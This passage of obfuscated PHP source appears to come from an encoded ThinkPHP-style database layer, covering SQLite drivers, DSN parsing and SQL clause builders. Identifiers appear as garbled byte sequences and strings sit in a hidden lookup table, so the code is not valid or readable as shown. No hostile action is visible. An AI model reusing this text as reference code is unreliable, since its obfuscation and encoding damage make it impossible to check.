_execSql($â¸ò—Ñ…) { if (!$this->_linkID || !$â¸ò—Ñ…) { return; } sqlite_query($this->_linkID, $â¸ò—Ñ…); } protected function initConnectAfter() { $íçÍ±£ı =& $_SERVER[ïÃ°£«Ê]; $this->_execSql($íçÍ±£ı[1125]); $this->_execSql($íçÍ±£ı[1126]); } public function query($ÓÇ†ø’) { $ËÆ¯ÅÌ = parent::query($ÓÇ†ø’); return $ËÆ¯ÅÌ; } public function execute($ÆÈù©Ú­) { $º°ƒÂÛã =& $_SERVER[ïÃ°£«Ê]; if (!CacheLock::fileLock($º°ƒÂÛã[1127])) { return !1; } $ç¶²Ï• = parent::execute($ÆÈù©Ú­); CacheLock::fileUnLock($º°ƒÂÛã[1127]); return $ç¶²Ï•; } } class DbSqlite3 extends DbSqlite3Base { protected function _execSql($åßÒƒÛæ) { if (!$this->_linkID || !$åßÒƒÛæ) { return; } $this->_linkID->exec($åßÒƒÛæ); } protected function initConnectAfter() { $»ä˜±ƒš =& $_SERVER[ïÃ°£«Ê]; $this->_execSql($»ä˜±ƒš[1125]); $this->_execSql($»ä˜±ƒš[1126]); } public function query($â¡°òË) { $‰ñÂšóŞ = parent::query($â¡°òË); return $‰ñÂšóŞ; } public function execute($ˆõÜóŒ¢) { $®œê‘´ =& $_SERVER[ïÃ°£«Ê]; if (!CacheLock::fileLock($®œê‘´[1127])) { return !1; } $ïïÓÃî¾ = parent::execute($ˆõÜóŒ¢); CacheLock::fileUnLock($®œê‘´[1127]); return $ïïÓÃî¾; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\75", "\x6e\x65\161" => "\x3c\x3e", "\x67\164" => "\x3e", "\145\147\x74" => "\x3e\75", "\x6c\164" => "\74", "\x65\154\164" => "\x3c\x3d", "\156\157\164\x6c\151\x6b\x65" => "\x4e\117\x54\x20\x4c\x49\x4b\105", "\x6c\x69\153\x65" => "\114\x49\x4b\105", "\x69\x6e" => "\x49\x4e", "\156\x6f\164\x69\x6e" => "\116\x4f\x54\40\x49\x4e", "\156\157\164\40\151\156" => "\116\x4f\124\40\x49\x4e", "\x62\145\x74\167\x65\x65\156" => "\x42\105\124\127\105\x45\116", "\x6e\157\164\142\145\164\x77\x65\x65\x6e" => "\x4e\117\x54\40\102\x45\x54\127\x45\105\x4e", "\x6e\157\164\40\142\145\x74\167\x65\145\156" => "\116\x4f\x54\40\x42\105\x54\127\x45\x45\116"); protected $selectSql = "\123\x45\x4c\105\x43\124\x25\x44\x49\x53\124\x49\116\x43\x54\x25\40\45\x46\111\x45\114\x44\45\40\106\122\x4f\115\40\45\124\x41\102\x4c\x45\x25\45\112\117\111\x4e\45\45\127\110\105\x52\105\x25\x25\x47\x52\117\125\120\45\x25\110\101\126\x49\116\107\45\45\x4f\122\x44\x45\122\x25\45\114\111\115\111\x54\x25\x20\x25\125\116\x49\x4f\x4e\45\45\x43\x4f\115\115\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ë³„åâˆ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ïÃ°£«Ê][1128], $ë³„åâˆ); } public function factory($¢Ú²ÉĞË = '') { $ÑÁî›õ¥ =& $_SERVER[ïÃ°£«Ê]; $¢Ú²ÉĞË = $this->parseConfig($¢Ú²ÉĞË); if (empty($¢Ú²ÉĞË[$ÑÁî›õ¥[1129]])) { think_exception(think_lang($ÑÁî›õ¥[1130])); } $this->dbType = ucwords(strtolower($¢Ú²ÉĞË[$ÑÁî›õ¥[1129]])); $»©£ßç… = $ÑÁî›õ¥[1131] . $this->dbType; if (class_exists($»©£ßç…)) { $š­Øİá¢ = new $»©£ßç…($¢Ú²ÉĞË); if ($ÑÁî›õ¥[1132] != strtolower($¢Ú²ÉĞË[$ÑÁî›õ¥[1129]])) { $š­Øİá¢->dbType = strtoupper($this->dbType); } else { $š­Øİá¢->dbType = $this->_getDsnType($¢Ú²ÉĞË[$ÑÁî›õ¥[1081]]); } } else { think_exception(think_lang($ÑÁî›õ¥[1133]) . $ÑÁî›õ¥[1134] . $»©£ßç…); } return $š­Øİá¢; } public function __call($¿¨âµÑš, $°ÔŠÇ‹È) { if (method_exists($this, $¿¨âµÑš)) { return call_user_func_array(array($this, $¿¨âµÑš), $°ÔŠÇ‹È); } } protected function _getDsnType($ÆüûÕ”) { $êÄ•„ÎÕ = explode($_SERVER[ïÃ°£«Ê][4], $ÆüûÕ”); $°åŠ†ÕŸ = strtoupper(trim($êÄ•„ÎÕ[0])); return $°åŠ†ÕŸ; } private function parseConfig($‹ğæÍë = '') { $ªî¯ØêÂ =& $_SERVER[ïÃ°£«Ê]; if (!empty($‹ğæÍë) && is_string($‹ğæÍë)) { $‹ğæÍë = $this->parseDSN($‹ğæÍë); } elseif (is_array($‹ğæÍë)) { $‹ğæÍë = array_change_key_case($‹ğæÍë); $‹ğæÍë = array($ªî¯ØêÂ[1129] => $‹ğæÍë[$ªî¯ØêÂ[1135]], $ªî¯ØêÂ[1050] => $‹ğæÍë[$ªî¯ØêÂ[1136]], $ªî¯ØêÂ[1051] => $‹ğæÍë[$ªî¯ØêÂ[1137]], $ªî¯ØêÂ[1048] => $‹ğæÍë[$ªî¯ØêÂ[1138]], $ªî¯ØêÂ[1049] => $‹ğæÍë[$ªî¯ØêÂ[1139]], $ªî¯ØêÂ[21] => $‹ğæÍë[$ªî¯ØêÂ[1140]], $ªî¯ØêÂ[1081] => $‹ğæÍë[$ªî¯ØêÂ[1141]], $ªî¯ØêÂ[17] => isset($‹ğæÍë[$ªî¯ØêÂ[1142]]) ? $‹ğæÍë[$ªî¯ØêÂ[1142]] : array()); } elseif (empty($‹ğæÍë)) { if (think_config($ªî¯ØêÂ[1143]) && $ªî¯ØêÂ[1132] != strtolower(think_config($ªî¯ØêÂ[1144]))) { $‹ğæÍë = $this->parseDSN(think_config($ªî¯ØêÂ[1143])); } else { $‹ğæÍë = array($ªî¯ØêÂ[1129] => think_config($ªî¯ØêÂ[1144]), $ªî¯ØêÂ[1050] => think_config($ªî¯ØêÂ[1145]), $ªî¯ØêÂ[1051] => think_config($ªî¯ØêÂ[1146]), $ªî¯ØêÂ[1048] => think_config($ªî¯ØêÂ[1147]), $ªî¯ØêÂ[1049] => think_config($ªî¯ØêÂ[1148]), $ªî¯ØêÂ[21] => think_config($ªî¯ØêÂ[323]), $ªî¯ØêÂ[1081] => think_config($ªî¯ØêÂ[1143]), $ªî¯ØêÂ[17] => think_config($ªî¯ØêÂ[1149])); } } return $‹ğæÍë; } protected function initConnect($Š‡Îéã = true) { if (1 == think_config($_SERVER[ïÃ°£«Ê][22])) { $this->_linkID = $this->multiConnect($Š‡Îéã); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } $this->initConnectAfter(); } protected function initConnectAfter() { } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ğß»¾ÑÅ => $µÁ·úÎ‹) { $this->_linkID = $µÁ·úÎ‹; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‡Óô¼Ş× = false) { $ú“ê¹ı =& $_SERVER[ïÃ°£«Ê]; static $ëÛ´ÔÃ÷ = array(); static $µîßµ®² = -1; if (empty($ëÛ´ÔÃ÷)) { foreach ($this->config as $‡Úò»äû => $‰ˆ‡×ã) { $ëÛ´ÔÃ÷[$‡Úò»äû] = explode($ú“ê¹ı[50], $‰ˆ‡×ã); } } if (think_config($ú“ê¹ı[1150])) { if ($‡Óô¼Ş× || think_config($ú“ê¹ı[486]) === !0) { $êÈŒşÈ = floor(mt_rand(0, think_config($ú“ê¹ı[1151]) - 1)); $µîßµ®² = $êÈŒşÈ; } else { if (is_numeric(think_config($ú“ê¹ı[1152]))) { $êÈŒşÈ = think_config($ú“ê¹ı[1152]); } else { $êÈŒşÈ = floor(mt_rand(think_config($ú“ê¹ı[1151]), count($ëÛ´ÔÃ÷[$ú“ê¹ı[1048]]) - 1)); } } } else { $êÈŒşÈ = floor(mt_rand(0, count($ëÛ´ÔÃ÷[$ú“ê¹ı[1048]]) - 1)); $µîßµ®² = $êÈŒşÈ; } $êÈŒşÈ = $µîßµ®² !== -1 ? $µîßµ®² : $êÈŒşÈ; $†¤ô€±ú = array($ú“ê¹ı[1050] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[1050]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[1050]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[1050]][0], $ú“ê¹ı[1051] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[1051]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[1051]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[1051]][0], $ú“ê¹ı[1048] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[1048]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[1048]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[1048]][0], $ú“ê¹ı[1049] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[1049]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[1049]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[1049]][0], $ú“ê¹ı[21] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[21]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[21]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[21]][0], $ú“ê¹ı[1081] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[1081]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[1081]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[1081]][0], $ú“ê¹ı[17] => isset($ëÛ´ÔÃ÷[$ú“ê¹ı[17]][$êÈŒşÈ]) ? $ëÛ´ÔÃ÷[$ú“ê¹ı[17]][$êÈŒşÈ] : $ëÛ´ÔÃ÷[$ú“ê¹ı[17]][0]); return $this->connect($†¤ô€±ú, $êÈŒşÈ); } public function parseDSN($ıÇÆ»„•) { $½¢Ç¹áÍ =& $_SERVER[ïÃ°£«Ê]; if (empty($ıÇÆ»„•)) { return !1; } $—µŞÖ‰ = parse_url($ıÇÆ»„•); if ($—µŞÖ‰[$½¢Ç¹áÍ[205]]) { $ı”Í¼¨¨ = array($½¢Ç¹áÍ[1129] => $—µŞÖ‰[$½¢Ç¹áÍ[205]], $½¢Ç¹áÍ[1050] => isset($—µŞÖ‰[$½¢Ç¹áÍ[684]]) ? $—µŞÖ‰[$½¢Ç¹áÍ[684]] : $½¢Ç¹áÍ[12], $½¢Ç¹áÍ[1051] => isset($—µŞÖ‰[$½¢Ç¹áÍ[1153]]) ? $—µŞÖ‰[$½¢Ç¹áÍ[1153]] : $½¢Ç¹áÍ[12], $½¢Ç¹áÍ[1048] => isset($—µŞÖ‰[$½¢Ç¹áÍ[206]]) ? $—µŞÖ‰[$½¢Ç¹áÍ[206]] : $½¢Ç¹áÍ[12], $½¢Ç¹áÍ[1049] => isset($—µŞÖ‰[$½¢Ç¹áÍ[207]]) ? $—µŞÖ‰[$½¢Ç¹áÍ[207]] : $½¢Ç¹áÍ[12], $½¢Ç¹áÍ[21] => isset($—µŞÖ‰[$½¢Ç¹áÍ[87]]) ? substr($—µŞÖ‰[$½¢Ç¹áÍ[87]], 1) : $½¢Ç¹áÍ[12]); } else { preg_match($½¢Ç¹áÍ[1154], trim($ıÇÆ»„•), $Ê¾©Ü¡ü); $ı”Í¼¨¨ = array($½¢Ç¹áÍ[1129] => $Ê¾©Ü¡ü[1], $½¢Ç¹áÍ[1050] => $Ê¾©Ü¡ü[2], $½¢Ç¹áÍ[1051] => $Ê¾©Ü¡ü[3], $½¢Ç¹áÍ[1048] => $Ê¾©Ü¡ü[4], $½¢Ç¹áÍ[1049] => $Ê¾©Ü¡ü[5], $½¢Ç¹áÍ[21] => $Ê¾©Ü¡ü[6]); } $ı”Í¼¨¨[$½¢Ç¹áÍ[1081]] = $½¢Ç¹áÍ[12]; return $ı”Í¼¨¨; } protected function debug() { $– Íˆ· =& $_SERVER[ïÃ°£«Ê]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $– Íˆ·[1155]; if (think_config($– Íˆ·[1156])) { think_status($– Íˆ·[1157]); think_trace($this->queryStr . $– Íˆ·[1158] . think_status($– Íˆ·[24], $– Íˆ·[1157], 6) . $– Íˆ·[1159], $– Íˆ·[12], $– Íˆ·[1160]); } } protected function parseLock($áö‡Ûò = false) { $°çûóñ· =& $_SERVER[ïÃ°£«Ê]; if (!$áö‡Ûò) { return $°çûóñ·[12]; } if ($°çûóñ·[1083] == $this->dbType) { return $°çûóñ·[1161]; } return $°çûóñ·[1162]; } protected function parseSet($Ò«À€úí) { $¢¢òø¹§ =& $_SERVER[ïÃ°£«Ê]; foreach ($Ò«À€úí as $ğÓ÷à•Û => $¶¦ï¬­) { if (is_array($¶¦ï¬­) && $¢¢òø¹§[372] == $¶¦ï¬­[0]) { $âÈ„ª½[] = $this->parseKey($ğÓ÷à•Û) . $¢¢òø¹§[464] . $¶¦ï¬­[1]; } elseif (is_scalar($¶¦ï¬­) || is_null($¶¦ï¬­)) { $âÈ„ª½[] = $this->parseKey($ğÓ÷à•Û) . $¢¢òø¹§[464] . $this->parseValue($¶¦ï¬­); } } return $¢¢òø¹§[1163] . implode($¢¢òø¹§[50], $âÈ„ª½); } protected function bindParam($ñçñµÉ, $èãäåÎó) { $this->bind[$_SERVER[ïÃ°£«Ê][4] . $ñçñµÉ] = $èãäåÎó; } protected function parseBind($òù¤—À©) { $òù¤—À© = array_merge($this->bind, $òù¤—À©); $this->bind = array(); return $òù¤—À©; } function parseKey(&$¯Ø—ïêÅ, $õºØ„ËÈ = true) { if ($õºØ„ËÈ) { $¯Ø—ïêÅ = $this->parseKeyCheck($¯Ø—ïêÅ); } return $¯Ø—ïêÅ; } function parseKeyCheck($–ÉûĞ¨) { $¡¸Ë²É¥ =& $_SERVER[ïÃ°£«Ê]; $–ÉûĞ¨ = trim($–ÉûĞ¨); if (!preg_match($¡¸Ë²É¥[1164], $–ÉûĞ¨)) { think_exception($¡¸Ë²É¥[1165] . $–ÉûĞ¨); } return $–ÉûĞ¨; } protected function parseValue($ÇĞë¬¢) { $èéª–ÃË =& $_SERVER[ïÃ°£«Ê]; if (is_string($ÇĞë¬¢)) { $ÇĞë¬¢ = $èéª–ÃË[1122] . $this->escapeString($ÇĞë¬¢) . $èéª–ÃË[1122]; } elseif (isset($ÇĞë¬¢[0]) && is_string($ÇĞë¬¢[0]) && strtolower($ÇĞë¬¢[0]) == $èéª–ÃË[372]) { $ÇĞë¬¢ = $this->escapeString($ÇĞë¬¢[1]); } elseif (is_array($ÇĞë¬¢)) { $ÇĞë¬¢ = array_map(array($this, $èéª–ÃË[1123]), $ÇĞë¬¢); } elseif (is_bool($ÇĞë¬¢)) { $ÇĞë¬¢ = $ÇĞë¬¢ ? $èéª–ÃË[91] : $èéª–ÃË[228]; } elseif (is_null($ÇĞë¬¢)) { $ÇĞë¬¢ = $èéª–ÃË[103]; } return $ÇĞë¬¢; } protected function parseField($×õğ‚Ğ) { $’¼œ¦åÃ =& $_SERVER[ïÃ°£«Ê]; if (is_string($×õğ‚Ğ) && strpos($×õğ‚Ğ, $’¼œ¦åÃ[50])) { $×õğ‚Ğ = explode($’¼œ¦åÃ[50], $×õğ‚Ğ); } if (is_array($×õğ‚Ğ)) { $ªŞ¿”ï = array(); foreach ($×õğ‚Ğ as $ä’–Ñî¶ => $Ó‚™­Óç) { if (!is_numeric($ä’–Ñî¶)) { $ªŞ¿”ï[] = $this->parseKey($ä’–Ñî¶, !1) . $’¼œ¦åÃ[1166] . $this->parseKey($Ó‚™­Óç); } else { $ªŞ¿”ï[] = $this->parseKey($Ó‚™­Óç); } } $ˆòâ•®ü = implode($’¼œ¦åÃ[50], $ªŞ¿”ï); } elseif (is_string($×õğ‚Ğ) && !empty($×õğ‚Ğ)) { $ˆòâ•®ü = $×õğ‚Ğ; } else { $ˆòâ•®ü = $’¼œ¦åÃ[220]; } return $ˆòâ•®ü; } protected function parseTable($†ßœñÔ) { $ÖÚ«‹š =& $_SERVER[ïÃ°£«Ê]; if (is_array($†ßœñÔ)) { $òÇœ÷±¶ = array(); foreach ($†ßœñÔ as $˜÷åÌñ => $ú™ùï‡Ú) { if (!is_numeric($˜÷åÌñ)) { $òÇœ÷±¶[] = $this->parseKey($˜÷åÌñ) . $ÖÚ«‹š[53] . $this->parseKey($ú™ùï‡Ú); } else { $òÇœ÷±¶[] = $this->parseKey($˜÷åÌñ); } } $†ßœñÔ = $òÇœ÷±¶; } elseif (is_string($†ßœñÔ)) { if (strstr($†ßœñÔ, $ÖÚ«‹š[53])) { return $†ßœñÔ; } $†ßœñÔ = explode($ÖÚ«‹š[50], $†ßœñÔ); array_walk($†ßœñÔ, array($this, $ÖÚ«‹š[1068])); } return $ÖÚ«‹š[1062] . trim(implode($ÖÚ«‹š[1167], $†ßœñÔ), $ÖÚ«‹š[475]) . $ÖÚ«‹š[1062]; } protected function parseWhere($›âÈ¶ã) { $•úİ™€ =& $_SERVER[ïÃ°£«Ê]; $àêçÍ… = $•úİ™€[12]; if (is_string($›âÈ¶ã)) { $àêçÍ… = $›âÈ¶ã; } else { $‘‚ı¿º = isset($›âÈ¶ã[$•úİ™€[1168]]) ? strtoupper($›âÈ¶ã[$•úİ™€[1168]]) : $•úİ™€[12]; if (in_array($‘‚ı¿º, array($•úİ™€[1169], $•úİ™€[1170], $•úİ™€[1171]))) { $‘‚ı¿º = $•úİ™€[53] . $‘‚ı¿º . $•úİ™€[53]; unset($›âÈ¶ã[$•úİ™€[1168]]); } else { $‘‚ı¿º = $•úİ™€[1172]; } foreach ($›âÈ¶ã as $»úÖ…Ñµ => $Ëâ•öèú) { $àêçÍ… .= $•úİ™€[355]; if (is_numeric($»úÖ…Ñµ)) { $»úÖ…Ñµ = $•úİ™€[1173]; } if (0 === strpos($»úÖ…Ñµ, $•úİ™€[11])) { $àêçÍ… .= $this->parseThinkWhere($»úÖ…Ñµ, $Ëâ•öèú); } else { if (!preg_match($•úİ™€[1174], trim($»úÖ…Ñµ))) { think_exception(think_lang($•úİ™€[1175]) . $•úİ™€[4] . $»úÖ…Ñµ); } $´¡‰òÔ = is_array($Ëâ•öèú) && isset($Ëâ•öèú[$•úİ™€[1176]]); $»úÖ…Ñµ = trim($»úÖ…Ñµ); if (strpos($»úÖ…Ñµ, $•úİ™€[212])) { $´ÖÊİ”ì = explode($•úİ™€[212], $»úÖ…Ñµ); $ššˆ‹´Ÿ = array(); foreach ($´ÖÊİ”ì as $ÅÁˆ¥Ç¢ => $ĞâŒ„İØ) { $ÓãÄüÏ– = $´¡‰òÔ ? $Ëâ•öèú[$ÅÁˆ¥Ç¢] : $Ëâ•öèú; $ššˆ‹´Ÿ[] = $•úİ™€[337] . $this->parseWhereItem($this->parseKey($ĞâŒ„İØ), $ÓãÄüÏ–) . $•úİ™€[1067]; } $àêçÍ… .= implode($•úİ™€[1177], $ššˆ‹´Ÿ); } elseif (strpos($»úÖ…Ñµ, $•úİ™€[284])) { $´ÖÊİ”ì = explode($•úİ™€[284], $»úÖ…Ñµ); $ššˆ‹´Ÿ = array(); foreach ($´ÖÊİ”ì as $ÅÁˆ¥Ç¢ => $ĞâŒ„İØ) { $ÓãÄüÏ– = $´¡‰òÔ ? $Ëâ•öèú[$ÅÁˆ¥Ç¢] : $Ëâ•öèú; $ššˆ‹´Ÿ[] = $•úİ™€[337] . $this->parseWhereItem($this->parseKey($ĞâŒ„İØ), $ÓãÄüÏ–) . $•úİ™€[1067]; } $àêçÍ… .= implode($•úİ™€[1172], $ššˆ‹´Ÿ); } else { $àêçÍ… .= $this->parseWhereItem($this->parseKey($»úÖ…Ñµ), $Ëâ•öèú); } } $àêçÍ… .= $•úİ™€[356] . $‘‚ı¿º; } $àêçÍ… = substr($àêçÍ…, 0, -strlen($‘‚ı¿º)); } return empty($àêçÍ…) ? $•úİ™€[12] : $•úİ™€[1178] . $àêçÍ…; } protected function parseWhereItem($ª…è‘Ê, $åØğÙ­Ü) { $£ü­ÔÅ› =& $_SERVER[ïÃ°£«Ê]; $¦åÂÁ¦° = $£ü­ÔÅ›[12]; if (is_array($åØğÙ­Ü)) { if (is_string($åØğÙ­Ü[0])) { $ƒÃİçïÓ = strtolower($åØğÙ­Ü[0]); if (in_array($åØğÙ­Ü[0], array($£ü­ÔÅ›[464], $£ü­ÔÅ›[1179], $£ü­ÔÅ›[1180], $£ü­ÔÅ›[1181], $£ü­ÔÅ›[1182], $£ü­ÔÅ›[1183]))) { $¦åÂÁ¦° .= $ª…è‘Ê . $£ü­ÔÅ›[53] . $åØğÙ­Ü[0] . $£ü­ÔÅ›[53] . $this->parseValue($åØğÙ­Ü[1]); } elseif (preg_match($£ü­ÔÅ›[1184], $åØğÙ­Ü[0])) { $¦åÂÁ¦° .= $ª…è‘Ê . $£ü­ÔÅ›[53] . $this->exp[$ƒÃİçïÓ] . $£ü­ÔÅ›[53] . $this->parseValue($åØğÙ­Ü[1]); } elseif (preg_match($£ü­ÔÅ›[1185], $åØğÙ­Ü[0])) { if (is_array($åØğÙ­Ü[1])) { $ùİéæã¯ = isset($åØğÙ­Ü[2]) ? strtoupper($åØğÙ­Ü[2]) : $£ü­ÔÅ›[1170]; if (in_array($ùİéæã¯, array($£ü­ÔÅ›[1169], $£ü­ÔÅ›[1170], $£ü­ÔÅ›[1171]))) { $ã­³ûƒ» = array(); foreach ($åØğÙ­Ü[1] as $Ä¸Õºúæ) { $ã­³ûƒ»[] = $ª…è‘Ê . $£ü­ÔÅ›[53] . $this->exp[$ƒÃİçïÓ] . $£ü­ÔÅ›[53] . $this->parseValue($Ä¸Õºúæ); } $¦åÂÁ¦° .= $£ü­ÔÅ›[337] . implode($£ü­ÔÅ›[53] . $ùİéæã¯ . $£ü­ÔÅ›[53], $ã­³ûƒ») . $£ü­ÔÅ›[1067]; } } else { $¦åÂÁ¦° .= $ª…è‘Ê . $£ü­ÔÅ›[53] . $this->exp[$ƒÃİçïÓ] . $£ü­ÔÅ›[53] . $this->parseValue($åØğÙ­Ü[1]); } } elseif ($£ü­ÔÅ›[372] == $ƒÃİçïÓ) { $¦åÂÁ¦° .= $£ü­ÔÅ›[1065] . $ª…è‘Ê . $£ü­ÔÅ›[53] . $åØğÙ­Ü[1] . $£ü­ÔÅ›[1186]; } elseif (preg_match($£ü­ÔÅ›[1187], $åØğÙ­Ü[0])) { $¦åÂÁ¦° .= $åØğÙ­Ü[0]; } elseif (preg_match($£ü­ÔÅ›[1188], $åØğÙ­Ü[0])) { if (isset($åØğÙ­Ü[2]) && $£ü­ÔÅ›[372] == $åØğÙ­Ü[2]) { $¦åÂÁ¦° .= $ª…è‘Ê . $£ü­ÔÅ›[53] . $this->exp[$ƒÃİçïÓ] . $£ü­ÔÅ›[53] . $åØğÙ­Ü[1]; } else { if (is_string($åØğÙ­Ü[1])) { $åØğÙ­Ü[1] = explode($£ü­ÔÅ›[50], $åØğÙ­Ü[1]); } $À°’¤î„ = implode($£ü­ÔÅ›[50], $this->parseValue($åØğÙ­Ü[1])); $¦åÂÁ¦° .= $ª…è‘Ê . $£ü­ÔÅ›[53] . $this->exp[$ƒÃİçïÓ] . $£ü­ÔÅ›[1065] . $À°’¤î„ . $£ü­ÔÅ›[1067]; } } elseif (preg_match($£ü­ÔÅ›[1189], $åØğÙ­Ü[0])) { $¼ê³îûé = is_string($åØğÙ­Ü[1]) ? explode($£ü­ÔÅ›[50], $åØğÙ­Ü[1]) : $åØğÙ­Ü[1]; $¦åÂÁ¦° .= $£ü­ÔÅ›[1065] . $ª…è‘Ê . $£ü­ÔÅ›[53] . $this->exp[$ƒÃİçïÓ] . $£ü­ÔÅ›[53] . $this->parseValue($¼ê³îûé[0]) . $£ü­ÔÅ›[1172] . $this->parseValue($¼ê³îûé[1]) . $£ü­ÔÅ›[356]; } else { think_exception(think_lang($£ü­ÔÅ›[1175]) . $£ü­ÔÅ›[4] . $åØğÙ­Ü[0]); } } else { $‘ü€ƒÂ€ = count($åØğÙ­Ü); $„êÀŞÇ = $£ü­ÔÅ›[12]; if (is_string($åØğÙ­Ü[$‘ü€ƒÂ€ - 1])) { $„êÀŞÇ = isset($åØğÙ­Ü[$‘ü€ƒÂ€ - 1]) ? strtoupper($åØğÙ­Ü[$‘ü€ƒÂ€ - 1]) : $£ü­ÔÅ›[12]; if (in_array($„êÀŞÇ, array($£ü­ÔÅ›[1169], $£ü­ÔÅ›[1170], $£ü­ÔÅ›[1171]))) { $‘ü€ƒÂ€ = $‘ü€ƒÂ€ - 1; } } else { $„êÀŞÇ = $£ü­ÔÅ›[1169]; } for ($ÆÍŒ®à¿ = 0; $ÆÍŒ®à¿ < $‘ü€ƒÂ€; $ÆÍŒ®à¿++) { $¼ê³îûé = is_array($åØğÙ­Ü[$ÆÍŒ®à¿]) ? $åØğÙ­Ü[$ÆÍŒ®à¿][1] : $åØğÙ­Ü[$ÆÍŒ®à¿]; if ($£ü­ÔÅ›[372] == strtolower($åØğÙ­Ü[$ÆÍŒ®à¿][0])) { $¦åÂÁ¦° .= $£ü­ÔÅ›[337] . $ª…è‘Ê . $£ü­ÔÅ›[53] . $¼ê³îûé . $£ü­ÔÅ›[1186] . $„êÀŞÇ . $£ü­ÔÅ›[53]; } else { $Ó±Ä×úŠ = is_array($åØğÙ­Ü[$ÆÍŒ®à¿]) ? $this->exp[strtolower($åØğÙ­Ü[$ÆÍŒ®à¿][0])] : $£ü­ÔÅ›[464]; if (!$Ó±Ä×úŠ && is_array($åØğÙ­Ü[$ÆÍŒ®à¿]) && in_array($åØğÙ­Ü[$ÆÍŒ®à¿][0], array($£ü­ÔÅ›[464], $£ü­ÔÅ›[1179], $£ü­ÔÅ›[1180], $£ü­ÔÅ›[1181], $£ü­ÔÅ›[1182], $£ü­ÔÅ›[1183]))) { $Ó±Ä×úŠ = $åØğÙ­Ü[$ÆÍŒ®à¿][0]; } $¦åÂÁ¦° .= $£ü­ÔÅ›[337] . $ª…è‘Ê . $£ü­ÔÅ›[53] . $Ó±Ä×úŠ . $£ü­ÔÅ›[53] . $this->parseValue($¼ê³îûé) . $£ü­ÔÅ›[1186] . $„êÀŞÇ . $£ü­ÔÅ›[53]; } } $¦åÂÁ¦° = substr($¦åÂÁ¦°, 0, -4); } } else { $¦åÂÁ¦° .= $ª…è‘Ê . $£ü­ÔÅ›[1190] . $this->parseValue($åØğÙ­Ü); } return $¦åÂÁ¦°; } protected function parseThinkWhere($ùá«íŒ, $ß´†ÜÙâ) { $ó†ˆÓÆ =& $_SERVER[ïÃ°£«Ê]; $®šÏïæ‰ = $ó†ˆÓÆ[12]; switch ($ùá«íŒ) { case $ó†ˆÓÆ[427]: $®šÏïæ‰ = $ß´†ÜÙâ; break; case $ó†ˆÓÆ[1173]: $®šÏïæ‰ = is_string($ß´†ÜÙâ) ? $ß´†ÜÙâ : substr($this->parseWhere($ß´†ÜÙâ), 6); break; case $ó†ˆÓÆ[1191]: parse_str($ß´†ÜÙâ, $ƒúĞ¾²); if (isset($ƒúĞ¾²[$ó†ˆÓÆ[1168]])) { $™“¶†ı = $ó†ˆÓÆ[53] . strtoupper($ƒúĞ¾²[$ó†ˆÓÆ[1168]]) . $ó†ˆÓÆ[53]; unset($ƒúĞ¾²[$ó†ˆÓÆ[1168]]); } else { $™“¶†ı = $ó†ˆÓÆ[1172]; } $¡¾Ì–µé = array(); foreach ($ƒúĞ¾² as $¾”¡Ÿ×ı => $÷ó‚£¸ü) { $¡¾Ì–µé[] = $this->parseKey($¾”¡Ÿ×ı) . $ó†ˆÓÆ[1190] . $this->parseValue($÷ó‚£¸ü); } $®šÏïæ‰ = implode($™“¶†ı, $¡¾Ì–µé); break; } return $®šÏïæ‰; } protected function parseLimit($ÜöŸó®ß) { $ª¢şÇÆ× =& $_SERVER[ïÃ°£«Ê]; return !empty($ÜöŸó®ß) ? $ª¢şÇÆ×[51] . $ÜöŸó®ß . $ª¢şÇÆ×[53] : $ª¢şÇÆ×[12]; } protected function parseJoin($øë£à€§) { $ˆŞ¾¤ı =& $_SERVER[ïÃ°£«Ê]; $ Ó½Æ­ = $ˆŞ¾¤ı[12]; if (!empty($øë£à€§)) { if (is_array($øë£à€§)) { foreach ($øë£à€§ as $–µç– ¡ => $™ÑÇöêå) { if (!1 !== stripos($™ÑÇöêå, $ˆŞ¾¤ı[1192])) { $ Ó½Æ­ .= $ˆŞ¾¤ı[53] . $™ÑÇöêå; } else { $ Ó½Æ­ .= $ˆŞ¾¤ı[1193] . $™ÑÇöêå; } } } else { $ Ó½Æ­ .= $ˆŞ¾¤ı[1193] . $øë£à€§; } } $ Ó½Æ­ = preg_replace($ˆŞ¾¤ı[1194], think_config($ˆŞ¾¤ı[1095]) . $ˆŞ¾¤ı[1195], $ Ó½Æ­); return $ Ó½Æ­; } protected function parseOrder($—Ìì—Å) { $€šŞ×ó® =& $_SERVER[ïÃ°£«Ê]; if (is_array($—Ìì—Å)) { 